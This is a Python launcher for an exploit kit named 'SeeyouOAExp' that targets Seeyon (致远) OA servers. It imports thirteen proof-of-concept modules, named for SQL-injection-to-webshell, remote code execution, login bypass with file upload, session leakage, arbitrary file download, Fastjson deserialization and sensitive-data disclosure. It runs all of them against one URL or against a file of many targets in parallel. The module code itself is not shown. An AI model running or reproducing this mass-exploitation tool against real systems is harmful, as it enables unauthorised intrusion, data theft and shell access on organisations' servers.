# -*- coding: utf-8 -*-
import os
import time
import argparse
import multiprocessing
from pyfiglet import Figlet
from rich.console import Console
from poc import 致远OA_A6_createMysql_数据库敏感信息泄露, 致远OA_A6_DownExcelBeanServlet_用户敏感信息下载, 致远OA_A6_initDataAssess_用户敏感信息泄露, \
    致远OA_A6_setextno_SQL注入Getshell, 致远OA_A6_test_SQL注入Getshell, 致远OA_A8_htmlofficeservlet_RCE, \
    致远OA_getSessionList_Session泄漏, 致远OA_ajax_登录绕过_任意文件上传, 致远OA_webmail_任意文件下载, 致远OA_Session泄露_任意文件上传, 致远OA_Fastjson_反序列化,致远OA_A6_config_jsp敏感信息泄露,致远OA_A8_status_jsp敏感信息泄露

console = Console()
def now_time():
    return time.strftime("[%H:%M:%S] ", time.localtime())
    

        
        
def main(target_url):
    if target_url[:4] != 'http':
        target_url = 'http://' + target_url
    if target_url[-1] != '/':
        target_url += '/'
    list = ['致远OA_A6_createMysql_数据库敏感信息泄露', '致远OA_A6_DownExcelBeanServlet_用户敏感信息下载', '致远OA_A6_initDataAssess_用户敏感信息泄露',
            '致远OA_A6_setextno_SQL注入Getshell', '致远OA_A6_test_SQL注入Getshell','致远OA_A8_htmlofficeservlet_RCE',
            '致远OA_getSessionList_Session泄漏', '致远OA_ajax_登录绕过_任意文件上传', '致远OA_webmail_任意文件下载',
            '致远OA_Session泄露_任意文件上传','致远OA_A6_config_jsp敏感信息泄露','致远OA_A8_status_jsp敏感信息泄露',
            '致远OA_Fastjson_反序列化']
    for i in list:
        eval(i+".main(target_url)")
        time.sleep(0.2)

if __name__ == '__main__':
    console.print(Figlet(font='slant').renderText('SeeyouOAExp'), style='bold blue')
    try:
        parser = argparse.ArgumentParser()
        parser.add_argument('-u', '--url', dest='url', help='Target Url')
        parser.add_argument('-f', '--file', dest='file', help='Target Url File', type=argparse.FileType('r'))
        args = parser.parse_args()
        if args.file:
            pool = multiprocessing.Pool()
            for url in args.file:
                console.print(now_time() + " [INFO]     正在检测:{}".format(url)+'\n', style='bold yellow')
                pool.apply(main, args=(url.strip('\n'),))
            pool.close()
            pool.join()
        elif args.url:
            console.print(now_time() + " [INFO]     正在检测:{}".format(args.url)+'\n', style='bold yellow')
            main(args.url)
        else:
            console.print('缺少URL目标, 请使用 [-u URL] or [-f FILE]')
    except KeyboardInterrupt:
        console.print('\nCTRL+C 退出', style='reverse bold red')
        pid=os.getpid()
        os.popen('taskkill.exe /f /pid:%d'%pid)   
